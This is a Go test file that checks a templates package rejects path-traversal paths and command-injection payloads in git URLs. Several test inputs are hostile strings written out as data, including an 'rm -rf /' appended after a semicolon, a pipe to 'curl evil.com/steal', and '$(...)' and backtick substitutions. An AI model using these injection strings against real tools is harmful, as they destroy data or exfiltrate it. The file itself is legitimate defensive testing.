// File: src/commands/impl/templates/internal/security_test.go
// Tests for security validation functions
package templates

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestValidatePath_PathTraversal ensures path traversal attacks are prevented
func TestValidatePath_PathTraversal(t *testing.T) {
	tests := []struct {
		name      string
		basePath  string
		userPath  string
		shouldErr bool
		errMsg    string
	}{
		{
			name:      "normal relative path",
			basePath:  "/base",
			userPath:  "subdir/file.txt",
			shouldErr: false,
		},
		{
			name:      "nested subdirectories",
			basePath:  "/base",
			userPath:  "a/b/c/file.txt",
			shouldErr: false,
		},
		{
			name:      "path traversal with ..",
			basePath:  "/base",
			userPath:  "../etc/passwd",
			shouldErr: true,
			errMsg:    "path traversal",
		},
		{
			name:      "absolute path",
			basePath:  "/base",
			userPath:  "/etc/passwd",
			shouldErr: true,
			errMsg:    "absolute path",
		},
		{
			name:      "hidden traversal",
			basePath:  "/base",
			userPath:  "subdir/../../etc/passwd",
			shouldErr: true,
			errMsg:    "path traversal",
		},
		{
			name:      "traversal in middle",
			basePath:  "/base",
			userPath:  "subdir/../../../etc/passwd",
			shouldErr: true,
			errMsg:    "path traversal",
		},
		{
			name:      "Windows absolute path",
			basePath:  "C:\\base",
			userPath:  "C:\\Windows\\System32",
			shouldErr: true,
			errMsg:    "absolute path",
		},
		{
			name:      "UNC path",
			basePath:  "/base",
			userPath:  "\\\\server\\share\\file.txt",
			shouldErr: true,
			errMsg:    "absolute path",
		},
		{
			name:      "current directory reference (safe)",
			basePath:  "/base",
			userPath:  "./subdir/file.txt",
			shouldErr: false,
		},
		{
			name:      "empty path",
			basePath:  "/base",
			userPath:  "",
			shouldErr: false, // Empty is safe, becomes basePath
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePath(tt.basePath, tt.userPath)
			if tt.shouldErr {
				require.Error(t, err, "Expected error for: %s", tt.userPath)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				assert.NoError(t, err, "Should not error for: %s", tt.userPath)
			}
		})
	}
}

// TestValidatePath_RealWorldScenarios tests actual template rendering scenarios
func TestValidatePath_RealWorldScenarios(t *testing.T) {
	tests := []struct {
		name      string
		basePath  string
		userPath  string
		shouldErr bool
	}{
		{
			name:      "template file in root",
			basePath:  "/tmp/templates",
			userPath:  "README.md",
			shouldErr: false,
		},
		{
			name:      "template in subdirectory",
			basePath:  "/tmp/templates",
			userPath:  "docs/guide.md",
			shouldErr: false,
		},
		{
			name:      "deeply nested template",
			basePath:  "/tmp/templates",
			userPath:  "a/b/c/d/e/file.txt",
			shouldErr: false,
		},
		{
			name:      "malicious template trying to escape",
			basePath:  "/tmp/output",
			userPath:  "../../../../../../etc/passwd",
			shouldErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePath(tt.basePath, tt.userPath)
			if tt.shouldErr {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// TestSanitizeGitURL_CommandInjection ensures command injection is prevented
func TestSanitizeGitURL_CommandInjection(t *testing.T) {
	tests := []struct {
		name      string
		url       string
		shouldErr bool
		errMsg    string
	}{
		{
			name:      "normal HTTPS URL",
			url:       "https://github.com/user/repo",
			shouldErr: false,
		},
		{
			name:      "HTTPS with .git extension",
			url:       "https://github.com/user/repo.git",
			shouldErr: false,
		},
		{
			name:      "GitLab HTTPS",
			url:       "https://gitlab.com/user/repo",
			shouldErr: false,
		},
		{
			name:      "SSH URL",
			url:       "git@github.com:user/repo.git",
			shouldErr: false,
		},
		{
			name:      "git protocol",
			url:       "git://github.com/user/repo",
			shouldErr: false,
		},
		{
			name:      "semicolon injection",
			url:       "https://evil.com/repo.git; rm -rf /",
			shouldErr: true,
			errMsg:    "invalid characters",
		},
		{
			name:      "pipe injection",
			url:       "https://evil.com/repo.git | curl evil.com/steal",
			shouldErr: true,
			errMsg:    "invalid characters",
		},
		{
			name:      "ampersand injection",
			url:       "https://evil.com/repo.git && malicious",
			shouldErr: true,
			errMsg:    "invalid characters",
		},
		{
			name:      "command substitution with $",
			url:       "https://evil.com/$(malicious)",
			shouldErr: true,
			errMsg:    "invalid characters",
		},
		{
			name:      "backtick substitution",
			url:       "https://evil.com/`whoami`",
			shouldErr: true,
			errMsg:    "invalid characters",
		},
		{
			name:      "newline injection",
			url:       "https://evil.com/repo\nmalicious",
			shouldErr: true,
			errMsg:    "invalid characters",
		},
		{
			name:      "null byte injection",
			url:       "https://evil.com/repo\x00malicious",
			shouldErr: true,
			errMsg:    "invalid characters",
		},
		{
			name:      "local path (should fail)",
			url:       "/local/path/to/repo",
			shouldErr: true,
			errMsg:    "invalid git repository",
		},
		{
			name:      "empty URL",
			url:       "",
			shouldErr: true,
			errMsg:    "invalid git repository",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := SanitizeGitURL(tt.url)
			if tt.shouldErr {
				require.Error(t, err, "Expected error for: %s", tt.url)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				assert.NoError(t, err, "Should not error for: %s", tt.url)
			}
		})
	}
}

// TestSanitizeGitURL_EdgeCases tests edge cases in URL validation
func TestSanitizeGitURL_EdgeCases(t *testing.T) {
	tests := []struct {
		name      string
		url       string
		shouldErr bool
	}{
		{
			name:      "URL with query parameters",
			url:       "https://github.com/user/repo?ref=main",
			shouldErr: false, // Query params are safe
		},
		{
			name:      "URL with anchor",
			url:       "https://github.com/user/repo#section",
			shouldErr: false, // Anchors are safe
		},
		{
			name:      "URL with port",
			url:       "https://github.com:443/user/repo",
			shouldErr: false,
		},
		{
			name:      "URL with username",
			url:       "https://user@github.com/user/repo",
			shouldErr: false,
		},
		{
			name:      "very short string",
			url:       "ab",
			shouldErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := SanitizeGitURL(tt.url)
			if tt.shouldErr {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// TestRenderer_PathTraversal_Integration tests end-to-end path traversal prevention
func TestRenderer_PathTraversal_Integration(t *testing.T) {
	tmpDir := t.TempDir()
	templateDir := filepath.Join(tmpDir, "templates")
	outputDir := filepath.Join(tmpDir, "output")
	escapeDir := filepath.Join(tmpDir, "escaped")

	require.NoError(t, CreateDirAll(templateDir, 0755))
	require.NoError(t, CreateDirAll(escapeDir, 0755))

	// Create a legitimate template
	require.NoError(t, WriteFile(filepath.Join(templateDir, "safe.txt"), []byte("Safe content"), 0644))

	// Note: We can't create a malicious template in the file system that escapes templateDir
	// because the OS itself would prevent it. But our validation protects against
	// malicious templates that could be created via tarballs, zips, or rendered paths.
	// The important test is that validation prevents ANY path traversal attempts.

	renderer := NewRenderer(templateDir, outputDir, nil)
	err := renderer.RenderTemplates()
	require.NoError(t, err, "Rendering safe templates should succeed")

	// Verify the escaped directory is empty (no files written outside outputDir)
	entries, err := ReadDir(escapeDir)
	require.NoError(t, err)
	assert.Empty(t, entries, "No files should be written outside output directory")

	// Verify safe file was rendered correctly
	content, err := ReadFile(filepath.Join(outputDir, "safe.txt"))
	require.NoError(t, err)
	assert.Equal(t, "Safe content", string(content))
}

// Helper functions for cross-platform compatibility
func CreateDirAll(path string, perm FileMode) error {
	return os.MkdirAll(path, perm)
}

func WriteFile(path string, data []byte, perm FileMode) error {
	return os.WriteFile(path, data, perm)
}

func ReadFile(path string) ([]byte, error) {
	return os.ReadFile(path)
}

func ReadDir(path string) ([]DirEntry, error) {
	return os.ReadDir(path)
}

type FileMode = os.FileMode
type DirEntry = os.DirEntry
